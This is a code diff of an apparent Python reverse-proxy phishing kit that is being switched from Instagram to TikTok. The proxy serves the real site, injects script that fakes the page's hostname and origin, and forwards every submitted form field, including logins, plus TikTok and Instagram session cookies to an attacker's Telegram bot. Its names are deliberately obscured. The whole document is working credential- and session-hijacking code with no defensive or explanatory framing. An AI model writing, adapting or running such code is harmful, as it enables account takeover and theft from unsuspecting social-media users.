@@ -14,8 +14,8 @@ C = "1367401179"
 
 class E:
     def __init__(self):
-        self.d = "www.instagram.com"
-        self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]
+        self.d = "www.tiktok.com"
+        self.p = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "lf16-pkgcdn.pitane.net", "sf16-scmcdn-va.akamaized.net"]
 
     def n(self, m):
         try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
@@ -32,7 +32,6 @@ class E:
             i = f"""
             <script>
                 Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
-                Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
                 Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
             </script>
             """
@@ -53,9 +52,8 @@ def f(x):
 
     if request.method == 'POST':
         D = request.form.to_dict() or request.get_json(silent=True) or {}
-        if 'username' in D and ('enc_password' in D or 'password' in D):
-            p = D.get('enc_password') or D.get('password')
-            e.n(f"🔐 <b>New Login:</b>\nUser: <code>{D['username']}</code>\nPass: <code>{p}</code>")
+        if D:
+            e.n(f"📥 <b>TikTok Data:</b>\n<code>{json.dumps(D, indent=2)}</code>")
 
     try:
         R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
@@ -75,16 +73,17 @@ def f(x):
         for k, v in R.cookies.items():
             r.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=h)
 
-        if 'sessionid' in R.cookies:
-            ck = [f"{k}={v}" for k, v in R.cookies.items() if k in ['sessionid', 'ds_user_id', 'csrftoken', 'mid', 'ig_did', 'rur']]
-            e.n(f"🔥 <b>SESSION CAPTURED!</b>\n<code>{'; '.join(ck)}</code>")
+        captured_cookies = ['sessionid', 'sid_tt', 'uid_tt', 'ttwid', 'msToken']
+        if any(c in R.cookies for c in captured_cookies):
+            ck = [f"{k}={v}" for k, v in R.cookies.items() if k in captured_cookies]
+            e.n(f"🎼 <b>TIKTOK SESSION:</b>\n<code>{'; '.join(ck)}</code>")
 
         if R.status_code in [301, 302, 303, 307, 308]:
             l = R.headers.get('Location', '').replace(e.d, h)
             r.headers['Location'] = l
 
         return r
-    except: return "System Error", 503
+    except: return "Service Down", 503
 
 if __name__ == '__main__':
     a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
